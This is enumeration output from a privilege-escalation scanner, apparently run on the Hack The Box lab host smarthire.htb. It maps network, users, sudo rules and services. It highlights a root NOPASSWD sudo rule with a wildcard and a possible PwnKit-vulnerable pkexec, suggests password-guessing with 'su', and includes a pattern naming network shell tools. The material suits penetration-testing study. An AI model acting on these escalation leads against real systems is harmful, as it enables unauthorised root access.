[1;34m══╣ [1;32mPer-user .rhosts files [1;90m(T1021.004)
[0m[1;90m.rhosts Not Found
[0m
[1;34m══╣ [1;32mPAM rhosts authentication [1;90m(T1021.004)
[0m[1;90m/etc/pam.d/rlogin|rsh Not Found
[0m
[1;34m══╣ [1;32mSSH HostbasedAuthentication [1;90m(T1021.004)
[0m  HostbasedAuthentication no or not set

[1;34m══╣ [1;32mPotential DNS control indicators (local) [1;90m(T1021.004)
[0m  Not detected

[1;34m╔══════════╣ [1;32mCrontab UI (root) misconfiguration checks [1;90m(T1053.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
[0m[1;90mcrontab-ui Not Found
[0m[1;34m╔══════════╣ [1;32mDeleted files still open [1;90m(T1083)
[0m[1;34m╚ [1;34m[3mOpen deleted files can hide tools and still consume disk space
[0mCOMMAND    PID   USER   FD   TYPE DEVICE SIZE/OFF NLINK   NODE NAME
gunicorn  1029 svcweb    6u   REG  253,0        0     0     21 /tmp/wgunicorn-kwkr8ns5 [1;31m(deleted)[0m
gunicorn  1029 svcweb    7u   REG  253,0        0     0     22 /tmp/wgunicorn-8u2h_bcg [1;31m(deleted)[0m
gunicorn  1029 svcweb    8u   REG  253,0        0     0     23 /tmp/wgunicorn-exh7t1jn [1;31m(deleted)[0m
gunicorn  1029 svcweb    9u   REG  253,0        0     0     24 /tmp/wgunicorn-b2voq8s6 [1;31m(deleted)[0m
gunicorn  1123 svcweb    7u   REG  253,0        0     0     22 /tmp/wgunicorn-8u2h_bcg [1;31m(deleted)[0m
gunicorn  1125 svcweb    8u   REG  253,0        0     0     23 /tmp/wgunicorn-exh7t1jn [1;31m(deleted)[0m
python3.1 1485 svcweb    6u   REG   0,43        0     0 131076 /tmp/wgunicorn-kpigh3xz [1;31m(deleted)[0m
python3.1 1485 svcweb    7u   REG   0,43        0     0 131316 /tmp/wgunicorn-hc8qmp3d [1;31m(deleted)[0m
python3.1 1485 svcweb    8u   REG   0,43        0     0 131362 /tmp/wgunicorn-0qcb4grd [1;31m(deleted)[0m
python3.1 1485 svcweb    9u   REG   0,43        0     0 131375 /tmp/wgunicorn-qfoew8lb [1;31m(deleted)[0m
python3.1 1486 svcweb    6u   REG   0,43        0     0 131076 /tmp/wgunicorn-kpigh3xz [1;31m(deleted)[0m
python3.1 1487 svcweb    7u   REG   0,43        0     0 131316 /tmp/wgunicorn-hc8qmp3d [1;31m(deleted)[0m
python3.1 1488 svcweb    8u   REG   0,43        0     0 131362 /tmp/wgunicorn-0qcb4grd [1;31m(deleted)[0m
python3.1 1489 svcweb    9u   REG   0,43        0     0 131375 /tmp/wgunicorn-qfoew8lb [1;31m(deleted)[0m
gunicorn  1695 svcweb    9u   REG  253,0        0     0     24 /tmp/wgunicorn-b2voq8s6 [1;31m(deleted)[0m
gunicorn  1751 svcweb    6u   REG  253,0        0     0     21 /tmp/wgunicorn-kwkr8ns5 [1;31m(deleted)[0m

[1;34m╔══════════╣ [1;32mDeleted executables still running [1;90m(T1083)
[0m[1;34m╚ [1;34m[3mA deleted /proc/<PID>/exe may indicate tampering, cleanup, or a useful runtime-only binary
[0m


[1;34m                              ╔═════════════════════╗
══════════════════════════════╣ [1;32mNetwork Information[1;34m ╠══════════════════════════════
[1;34m                              ╚═════════════════════╝[0m
[1;34m╔══════════╣ [1;32mInterfaces [1;90m(T1016)
[0m# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::b06d:82ff:fe8b:655c  prefixlen 64  scopeid 0x20<link>
        ether b2:6d:82:8b:65:5c  txqueuelen 0  (Ethernet)
        RX packets 1686  bytes 10011443 (10.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1734  bytes 213960 (213.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.245.215  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb9:c026  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:c026  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:c0:26  txqueuelen 1000  (Ethernet)
        RX packets 658314  bytes 105449102 (105.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 772927  bytes 151973087 (151.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3170351  bytes 301995945 (301.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3170351  bytes 301995945 (301.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth9bb26eb: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::14fe:82ff:fe0f:d1be  prefixlen 64  scopeid 0x20<link>
        ether 16:fe:82:0f:d1:be  txqueuelen 0  (Ethernet)
        RX packets 1686  bytes 10035047 (10.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1749  bytes 215106 (215.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[1;34m══╣ [1;32mRouting & policy quick view [1;90m(T1016)
[0mdefault via 10.129.0.1 dev eth0 
10.129.0.0/16 dev eth0 proto kernel scope link src 10.129.245.215 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 
::1 dev lo proto kernel metric 256 pref medium
dead:beef::/64 dev eth0 proto kernel metric 256 expires 86393sec pref medium
fe80::/64 dev eth0 proto kernel metric 256 pref medium
fe80::/64 dev veth9bb26eb proto kernel metric 256 pref medium
fe80::/64 dev docker0 proto kernel metric 256 pref medium
default via fe80::250:56ff:feb9:4f07 dev eth0 proto ra metric 1024 expires 23sec hoplimit 64 pref medium

0:	from all lookup local
32766:	from all lookup main
32767:	from all lookup default
[1;34m══╣ [1;32mVirtual/overlay interfaces quick view [1;90m(T1016)
[0m1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000
3: [1;31;103mdocker[0m0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP mode DEFAULT group default 
    [1;31;103mbridge[0m forward_delay 1500 hello_time 200 max_age 2000 ageing_time 30000 stp_state 0 priority 32768 [1;31;103mvlan[0m_filtering 0 [1;31;103mvlan[0m_protocol 802.1Q [1;31;103mbridge[0m_id 8000.b2:6d:82:8b:65:5c designated_root 8000.b2:6d:82:8b:65:5c root_port 0 root_path_cost 0 topology_change 0 topology_change_detected 0 hello_timer    0.00 tcn_timer    0.00 topology_change_timer    0.00 gc_timer  108.06 [1;31;103mvlan[0m_default_pvid 1 [1;31;103mvlan[0m_stats_enabled 0 [1;31;103mvlan[0m_stats_per_port 0 group_fwd_mask 0 group_address 01:80:c2:00:00:00 mcast_snooping 1 mcast_router 1 mcast_query_use_ifaddr 0 mcast_querier 0 mcast_hash_elasticity 16 mcast_hash_max 4096 mcast_last_member_count 2 mcast_startup_query_count 2 mcast_last_member_interval 100 mcast_membership_interval 26000 mcast_querier_interval 25500 mcast_query_interval 12500 mcast_query_response_interval 1000 mcast_startup_query_interval 3124 mcast_stats_enabled 0 mcast_igmp_version 2 mcast_mld_version 1 nf_call_iptables 0 nf_call_ip6tables 0 nf_call_arptables 0 addrgenmode eui64 numtxqueues 1 numrxqueues 1 gso_max_size 65536 gso_max_segs 65535 
4: [1;31;103mveth[0m9bb26eb@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master [1;31;103mdocker[0m0 state UP mode DEFAULT group default 
    [1;31;103mveth[0m 
    [1;31;103mbridge[0m_slave state forwarding priority 32 cost 2 hairpin off guard off root_block off fastleave off learning on flood on port_id 0x8001 port_no 0x1 designated_port 32769 designated_cost 0 designated_[1;31;103mbridge[0m 8000.b2:6d:82:8b:65:5c designated_root 8000.b2:6d:82:8b:65:5c hold_timer    0.00 message_age_timer    0.00 forward_delay_timer    0.00 topology_change_ack 0 config_pending 0 proxy_arp off proxy_arp_wifi off mcast_router 1 mcast_fast_leave off mcast_flood on mcast_to_unicast off neigh_suppress off group_fwd_mask 0 group_fwd_mask_str 0x0 [1;31;103mvlan[0m_[1;31;103mtun[0mnel off isolated off addrgenmode eui64 numtxqueues 2 numrxqueues 2 gso_max_size 65536 gso_max_segs 65535 
[1;34m══╣ [1;32mNetwork namespaces quick view [1;90m(T1016)
[0m[1;34m══╣ [1;32mForwarding status [1;90m(T1016)
[0mnet.ipv4.ip_forward [1;31;103m= 1[0m
net.ipv6.conf.all.forwarding = 0

[1;34m╔══════════╣ [1;32mHostname, hosts and DNS [1;90m(T1016,T1018)
[0m[1;34m══╣ [1;32mHostname Information [1;90m(T1016,T1018)
[0mSystem hostname: smarthire
FQDN: smarthire

[1;34m══╣ [1;32mHosts File Information [1;90m(T1016,T1018)
[0mContents of /etc/hosts:
  127.0.0.1 localhost smarthire.htb models.smarthire.htb
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

[1;34m══╣ [1;32mDNS Configuration [1;90m(T1016,T1018)
[0mDNS Servers (resolv.conf):
  127.0.0.53
  search .
-e 
Systemd-resolved configuration:
  [Resolve]
-e 
NetworkManager DNS settings:
-e 
DNS Domain Information:
(none)

[1;34m╔══════════╣ [1;32mActive Ports [1;90m(T1049)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
[0m[1;34m══╣ [1;32mActive Ports (netstat) [1;90m(T1049)
[0mtcp        0      0 [1;31m127.0.0.1[0m:44879         [1;31m0.0.0.0[0m:*               LISTEN      -                   
tcp        0      0 [1;31m127.0.0.1[0m:8000          [1;31m0.0.0.0[0m:*               LISTEN      1029/python3        
tcp        0      0 [1;31m0.0.0.0[0m:80              [1;31m0.0.0.0[0m:*               LISTEN      -                   
tcp        0      0 [1;31m0.0.0.0[0m:22              [1;31m0.0.0.0[0m:*               LISTEN      -                   
tcp        0      0 [1;31m127.0.0.53[0m:53           [1;31m0.0.0.0[0m:*               LISTEN      -                   
tcp        0      0 [1;31m127.0.0.1[0m:5000          [1;31m0.0.0.0[0m:*               LISTEN      -                   
tcp6       0      0 [1;31m:::[0m22                   [1;31m:::[0m*                    LISTEN      -                   
[1;34m══╣ [1;32mLocal-only listeners (loopback) [1;90m(T1049)
[0mtcp   LISTEN 0      4096       [1;31m127.0.0.1:[0m44879      0.0.0.0:*                                                                                                                                                  
tcp   LISTEN 0      2048       [1;31m127.0.0.1:[0m8000       0.0.0.0:*    users:(("gunicorn",pid=1751,fd=5),("gunicorn",pid=1695,fd=5),("gunicorn",pid=1125,fd=5),("gunicorn",pid=1123,fd=5),("gunicorn",pid=1029,fd=5))
tcp   LISTEN 0      4096       [1;31m127.0.0.1:[0m5000       0.0.0.0:*                                                                                                                                                  
[1;34m══╣ [1;32mUnique listener bind addresses [1;90m(T1049)
[0m::
0.0.0.0
[1;31m127.0.0.1[0m
127.0.0.53%lo
[1;34m══╣ [1;32mPotential local forwarders/relays [1;90m(T1049)
[0msvcweb     37058  0.0  0.0   6696  1124 pts/1    S+   03:32   0:00 sed -E s,[1;31;103msocat[0m|[1;31;103mssh[0m|[1;31;103m-L[0m|[1;31;103m-R[0m|[1;31;103m-D[0m|[1;31;103mncat[0m|[1;31;103mnc[0m,?[1;31;103m&?[0m,g

[1;34m╔══════════╣ [1;32mNetwork Traffic Analysis Capabilities [1;90m(T1040)
[0m
[1;34m══╣ [1;32mAvailable Sniffing Tools [1;90m(T1040)
[0m[1;31mNo sniffing tools found[0m

[1;34m══╣ [1;32mNetwork Interfaces Sniffing Capabilities [1;90m(T1040)
[0mInterface lo (loopback): [1;31mNot sniffable[0m
Interface eth0: [1;31mNot sniffable[0m
Interface docker0: [1;31mNot sniffable[0m
Interface veth9bb26eb@if2: [1;31mNot sniffable[0m
[1;31mNo sniffable interfaces found[0m

[1;34m══╣ [1;32mRunning sniffing/traffic reconstruction processes [1;90m(T1040)
[0m
[1;34m╔══════════╣ [1;32mFirewall Rules Analysis [1;90m(T1016)
[0m
[1;34m══╣ [1;32mIptables Rules [1;90m(T1016)
[0m[1;31mNo permission to list iptables rules[0m

[1;34m══╣ [1;32mNftables Rules [1;90m(T1016)
[0m[1;31mNo permission to list nftables rules[0m

[1;34m══╣ [1;32mFirewalld Rules [1;90m(T1016)
[0m[1;90mfirewalld Not Found
[0m
[1;34m══╣ [1;32mUFW Rules [1;90m(T1016)
[0m[1;90mufw Not Found
[0m
[1;34m══╣ [1;32mForwarding and rp_filter [1;90m(T1016)
[0mnet.ipv4.ip_forward [1;31;103m= 1[0m
net.ipv6.conf.all.forwarding = 0
net.ipv4.conf.all.rp_filter = 2

[1;34m╔══════════╣ [1;32mInetd/Xinetd Services Analysis [1;90m(T1049)
[0m
[1;34m══╣ [1;32mInetd Services [1;90m(T1049)
[0m[1;90minetd Not Found
[0m
[1;34m══╣ [1;32mXinetd Services [1;90m(T1049)
[0m[1;90mxinetd Not Found
[0m
[1;34m══╣ [1;32mRunning Inetd/Xinetd Services [1;90m(T1049)
[0mActive Services (from netstat):
-e 
Active Services (from ss):
-e 
Running Service Processes:

[1;34m╔══════════╣ [1;32mInternet Access? [1;90m(T1016,T1590)
[0mDNS is not accessible
Port 443 is not accessible
ICMP is not accessible
Port 80 is not accessible
ICMP is not accessible
Port 443 is not accessible with curl

[1;34m══╣ [1;32mProxy discovery [1;90m(T1016,T1590)
[0m[1;34m╚ [1;34m[3mChecking common proxy env vars and apt proxy config
[0m


[1;34m                               ╔═══════════════════╗
═══════════════════════════════╣ [1;32mUsers Information[1;34m ╠═══════════════════════════════
[1;34m                               ╚═══════════════════╝[0m
[1;34m╔══════════╣ [1;32mMy user [1;90m(T1033)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
[0muid=1000([1;96m[1;95msvcweb[0m[0m) gid=1000([1;96m[1;95msvcweb[0m[0m) groups=1000([1;96m[1;95msvcweb[0m[0m),1001(mlflowweb),1002(devs)

[1;34m╔══════════╣ [1;32mPGP Keys and Related Files [1;90m(T1552.004)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys
[0m[1;96mGPG:[0m
GPG is installed, listing keys:
[1;96m-e [0m
[1;96mNetPGP:[0m
[1;90mnetpgpkeys Not Found
[0m[1;96m-e [0m
[1;96mPGP Related Files:[0m
Found: /home/svcweb/.gnupg
total 20
drwx------ 3 svcweb svcweb 4096 Jul  2 03:32 .
drwxr-x--- 6 svcweb svcweb 4096 May 13 16:15 ..
drwx------ 2 svcweb svcweb 4096 Sep 19  2025 private-keys-v1.d
-rw------- 1 svcweb svcweb   32 Sep 19  2025 pubring.kbx
-rw------- 1 svcweb svcweb 1200 Sep 19  2025 trustdb.gpg

[1;34m╔══════════╣ [1;32mChecking 'sudo -l', /etc/sudoers, and /etc/sudoers.d [1;90m(T1548.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
[0mMatching Defaults entries for [1;31msvcweb[0m on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User [1;31msvcweb[0m may run the following commands on smarthire:
    (root) [1;31mNOPASSWD[0m: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py[1;31;103m *[0m
Matching Defaults entries for [1;31msvcweb[0m on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User [1;31msvcweb[0m may run the following commands on smarthire:
    (root) [1;31mNOPASSWD[0m: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py[1;31;103m *[0m


[1;34m╔══════════╣ [1;32mChecking sudo tokens [1;90m(T1548.003)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
[0mptrace protection [1;32mis enabled[0m (1)

[1;90mdoas.conf Not Found
[0m
[1;34m╔══════════╣ [1;32mChecking Pkexec and Polkit [1;90m(T1548.003,T1548.004,T1068)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2
[0m
[1;34m══╣ [1;32mPolkit Binary [1;90m(T1548.003,T1068)
[0m[1;96mPkexec binary found at: /usr/bin/pkexec[0m
[1;31mPkexec binary has SUID bit set![0m
-rwsr-xr-x 1 root root 30872 Apr 10 10:59 /usr/bin/pkexec
pkexec version 0.105
[1;31;103mPotentially vulnerable to CVE-2021-4034 (PwnKit) - check distro patches[0m

[1;34m══╣ [1;32mPolkit Policies [1;90m(T1548.003)
[0m[1;96mChecking /etc/polkit-1/localauthority.conf.d/:[0m

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
[1;96mChecking /usr/share/polkit-1/rules.d/:[0m
// -*- mode: js2 -*-
polkit.addRule(function(action, subject) {
    if ((action.id === "org.freedesktop.bolt.enroll" ||
	 action.id === "org.freedesktop.bolt.authorize" ||
	 action.id === "org.freedesktop.bolt.[1;34mman[0mage") &&
        subject.active === true && subject.local === true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.fwupd.update-internal" &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.packagekit.upgrade-[1;34msys[0mtem" ||
         action.id == "org.freedesktop.packagekit.trigger-offline-update") &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
// This file is part of [1;34msys[0mtemd.
// See [1;34msystemd-network[0md.service(8) and polkit(8) for more information.

// Allow [1;34msystemd-network[0md to set timezone, get product UUID,
// and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "[1;34msystemd-network[0m") {
        return polkit.Result.YES;
    }
});

[1;34m══╣ [1;32mPolkit Authentication Agent [1;90m(T1548.004)
[0mroot         769  0.0  0.1 234512  6676 ?        Ssl  02:35   0:00 /usr/libexec/polkitd --no-debug

[1;34m╔══════════╣ [1;32mSuperusers and UID 0 Users [1;90m(T1087.001)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html
[0m
[1;34m══╣ [1;32mUsers with UID 0 in /etc/passwd [1;90m(T1087.001)
[0m[1;31mroot[0m:x:0:0:[1;31mroot[0m:/[1;31mroot[0m:/bin/bash

[1;34m══╣ [1;32mUsers with sudo privileges in sudoers [1;90m(T1087.001)
[0m
[1;34m╔══════════╣ [1;32mUsers with console [1;90m(T1087.001)
[0m[1;31mroot[0m:x:0:0:root:/root:/bin/bash
[1;96m[1;95msvcweb[0m[0m:x:1000:1000:smarthire_user:/home/svcweb:/bin/bash

[1;34m╔══════════╣ [1;32mAll users & groups [1;90m(T1087.001,T1069.001)
[0muid=0[1;31m([1;31mroot[0m)[0m gid=0[1;31m(root)[0m groups=0[1;31m(root)[0m
uid=1000([1;96m[1;95msvcweb[0m[0m) gid=1000([1;96m[1;95msvcweb[0m[0m) groups=1000([1;96m[1;95msvcweb[0m[0m),1001(mlflowweb),1002(devs)
uid=100([1;34m_apt[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=101([1;34msystemd-network[0m) gid=102([1;34msystemd-network[0m) groups=102([1;34msystemd-network[0m)
uid=102([1;34msystemd-resolve[0m) gid=103([1;34msystemd-resolve[0m) groups=103([1;34msystemd-resolve[0m)
uid=103([1;34mmessagebus[0m) gid=104([1;34mmessagebus[0m) groups=104([1;34mmessagebus[0m)
uid=104([1;34msystemd-timesync[0m) gid=105([1;34msystemd-timesync[0m) groups=105([1;34msystemd-timesync[0m)
uid=105([1;34mpollinate[0m) gid=1([1;34m[1;32mdaemon[0m[0m) groups=1([1;34m[1;32mdaemon[0m[0m)
uid=106([1;34m[1;32msyslog[0m[0m) gid=113([1;34m[1;32msyslog[0m[0m) groups=113([1;34m[1;32msyslog[0m[0m),4[1;31m(adm)[0m
uid=107([1;34muuidd[0m) gid=114([1;34muuidd[0m) groups=114([1;34muuidd[0m)
uid=109([1;34mtss[0m) gid=116([1;34mtss[0m) groups=116([1;34mtss[0m)
uid=10([1;34muucp[0m) gid=10([1;34muucp[0m) groups=10([1;34muucp[0m)
uid=110([1;34mlandscape[0m) gid=117([1;34mlandscape[0m) groups=117([1;34mlandscape[0m)
uid=111([1;34mfwupd-refresh[0m) gid=118([1;34mfwupd-refresh[0m) groups=118([1;34mfwupd-refresh[0m)
uid=112([1;34musbmux[0m) gid=46[1;32m(plugdev)[0m groups=46[1;32m(plugdev)[0m
uid=113([1;34msshd[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=114([1;34mdnsmasq[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=13([1;34mproxy[0m) gid=13([1;34mproxy[0m) groups=13([1;34mproxy[0m)
uid=1([1;34m[1;32mdaemon[0m[0m) gid=1([1;34m[1;32mdaemon[0m[0m) groups=1([1;34m[1;32mdaemon[0m[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33([1;34m[1;32mwww-data[0m[0m) gid=33([1;34m[1;32mwww-data[0m[0m) groups=33([1;34m[1;32mwww-data[0m[0m)
uid=34([1;34mbackup[0m) gid=34([1;34mbackup[0m) groups=34([1;34mbackup[0m)
uid=38([1;34mlist[0m) gid=38([1;34mlist[0m) groups=38([1;34mlist[0m)
uid=39([1;34mirc[0m) gid=39([1;34mirc[0m) groups=39([1;34mirc[0m)
uid=3([1;34msys[0m) gid=3([1;34msys[0m) groups=3([1;34msys[0m)
uid=41([1;34mgnats[0m) gid=41([1;34mgnats[0m) groups=41([1;34mgnats[0m)
uid=4([1;34msync[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=5([1;34mgames[0m) gid=60([1;34mgames[0m) groups=60([1;34mgames[0m)
uid=65534([1;34mnobody[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=6([1;34mman[0m) gid=12([1;34mman[0m) groups=12([1;34mman[0m)
uid=7([1;34mlp[0m) gid=7([1;34mlp[0m) groups=7([1;34mlp[0m)
uid=8([1;34m[1;32mmail[0m[0m) gid=8([1;34m[1;32mmail[0m[0m) groups=8([1;34m[1;32mmail[0m[0m)
uid=998([1;34m_laurel[0m) gid=998([1;34m_laurel[0m) groups=998([1;34m_laurel[0m)
uid=999[1;31m([1;34mlxd[0m)[0m gid=100(users) groups=100(users)
uid=9([1;34mnews[0m) gid=9([1;34mnews[0m) groups=9([1;34mnews[0m)

[1;34m╔══════════╣ [1;32mCurrently Logged in Users [1;90m(T1033)
[0m
[1;34m══╣ [1;32mBasic user information [1;90m(T1033)
[0m 03:32:35 up 56 min,  0 users,  load average: 1.42, 0.84, 0.45
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[1;34m══╣ [1;32mActive sessions [1;90m(T1033)
[0m 03:32:35 up 56 min,  0 users,  load average: 1.42, 0.84, 0.45
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[1;34m══╣ [1;32mLogged in users (utmp) [1;90m(T1033)
[0m           [1;34msys[0mtem boot  2026-07-02 02:35
LOGIN      tty1         2026-07-02 02:36              1037 id=tty1
           run-level 5  2026-07-02 02:36

[1;34m══╣ [1;32mSSH sessions [1;90m(T1033)
[0m
[1;34m══╣ [1;32mScreen sessions [1;90m(T1033)
[0mNo Sockets found in /run/screen/S-[1;96m[1;95msvcweb[0m[0m.


[1;34m══╣ [1;32mTmux sessions [1;90m(T1033)
[0m
[1;34m╔══════════╣ [1;32mLast Logons and Login History [1;90m(T1033)
[0m
[1;34m══╣ [1;32mLast logins [1;90m(T1033)
[0mreboot   [1;34msys[0mtem boot  5.15.0-177-gener Thu Jul  2 02:35   still running
[1;31mroot[0m     tty1                          Wed May 13 16:46 - down   (00:03)
reboot   [1;34msys[0mtem boot  5.15.0-177-gener Wed May 13 16:20 - 16:49  (00:29)
reboot   [1;34msys[0mtem boot  5.15.0-177-gener Wed May 13 16:12 - 16:49  (00:36)
reboot   [1;34msys[0mtem boot  5.15.0-177-gener Wed May 13 16:08 - 16:10  (00:01)
reboot   [1;34msys[0mtem boot  5.15.0-177-gener Wed May 13 16:01 - 16:03  (00:01)
reboot   [1;34msys[0mtem boot  5.15.0-177-gener Wed May 13 15:27 - 15:29  (00:01)

wtmp begins Wed May 13 15:27:27 2026

[1;34m══╣ [1;32mFailed login attempts [1;90m(T1033)
[0m
[1;34m══╣ [1;32mRecent logins from auth.log (limit 20) [1;90m(T1033)
[0m
[1;34m══╣ [1;32mLast time logon each user [1;90m(T1033)
[0mUsername         Port     From             Latest
[1;31mroot[0m             tty1                      Wed May 13 16:46:22 +0000 2026

[1;34m╔══════════╣ [1;32mDo not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
[0m
[0m[1;34m╔══════════╣ [1;32mDo not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
[0m
[0m[1;34m╔══════════╣ [1;32mActual Group Memberships via newgrp [1;90m(T1069.001)
[0m


[1;34m                             ╔══════════════════════╗
═════════════════════════════╣ [1;32mSoftware Information[1;34m ╠═════════════════════════════
[1;34m                             ╚══════════════════════╝[0m
[1;34m╔══════════╣ [1;32mUseful software [1;90m(T1082)
[0m/usr/bin/base64
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/sbin/runc
/usr/bin/sudo
/usr/bin/wget

[1;34m╔══════════╣ [1;32mInstalled Compilers [1;90m(T1587.001)
[0mii  g++                                    4:11.2.0-1ubuntu1                                amd64        GNU C++ compiler
ii  g++-11                                 11.4.0-1ubuntu1~22.04.3                          amd64        GNU C++ compiler
ii  gcc                                    4:11.2.0-1ubuntu1                                amd64        GNU C compiler
ii  gcc-11                                 11.4.0-1ubuntu1~22.04.3                          amd64        GNU C compiler
ii  rpcsvc-proto                           1.4.2-0ubuntu6                                   amd64        RPC protocol compiler and definitions
/usr/bin/gcc

[1;34m╔══════════╣ [1;32mAnalyzing Apache-Nginx Files (limit 70)
[0mApache version: [1;90mapache2 Not Found
[0m[1;90mhttpd Not Found
[0m
Nginx version: 
[1;34m══╣ [1;32mNginx modules
[0mngx_http_geoip2_module.so
[1;32mngx_http_image_filter_module.so[0m
[1;32mngx_http_xslt_filter_module.so[0m
[1;32mngx_mail_module.so[0m
ngx_stream_geoip2_module.so
[1;32mngx_stream_module.so[0m
[1;34m══╣ [1;32mPHP exec extensions
[0mdrwxr-xr-x 2 root root 4096 Sep 16  2025 /etc/nginx/[1;31msites-enabled[0m
[1;31mdrwxr-xr-x 2 root root 4096 Sep 16  2025 /etc/nginx/sites-enabled[0m
[1;31mlrwxrwxrwx 1 root root 36 Sep 16  2025 /etc/nginx/sites-enabled/smarthire -> /etc/nginx/sites-available/smarthire[0m
server {
    listen 80;
    server_name smarthire.htb;
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
server {
    listen 80;
    server_name models.smarthire.htb;
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
[1;31mlrwxrwxrwx 1 root root 43 Sep 16  2025 /etc/nginx/sites-enabled/default_redirect -> /etc/nginx/sites-available/default_redirect[0m
server {
    listen 80 default_server;
    server_name _;
    if ($host ~* "^smarthire\.htb$") {
        return 301 http://smarthire.htb$request_uri;
    }
    if ($host ~* "^models\.smarthire\.htb$") {
        return 301 http://experiment.smarthire.htb$request_uri;
    }
    return 301 http://smarthire.htb$request_uri;
}




-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/[1;31mnginx.conf[0m
[1;31m[0mu[1;31m[0ms[1;31m[0me[1;31m[0mr[1;31m[0m [1;31m[0mw[1;31m[0mw[1;31m[0mw[1;31m[0m-[1;31m[0md[1;31m[0ma[1;31m[0mt[1;31m[0ma[1;31m[0m;[1;31m[0m
